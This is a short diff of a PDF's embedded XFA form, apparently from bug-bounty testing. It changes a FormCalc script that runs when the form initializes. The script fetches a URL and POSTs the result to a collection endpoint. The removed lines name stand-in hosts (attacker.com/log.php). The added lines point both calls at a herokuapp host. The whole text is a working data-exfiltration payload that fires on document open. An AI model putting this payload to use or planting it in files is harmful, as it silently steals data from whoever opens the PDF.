@@ -15,8 +15,8 @@ stream
         <field id="Hello World!">
             <event activity="initialize">
                 <script contentType='application/x-formcalc'>
-                    var content = GET("http://example.com/whateveryouwantToSteal")
-                    POST("http://attacker.com/log.php",content)
+                    var content = GET("https://bughunt1307.herokuapp.com/caja.html")
+                    POST("https://bughunt1307.herokuapp.com/post.php",content)
                 </script>
             </event>
         </field>
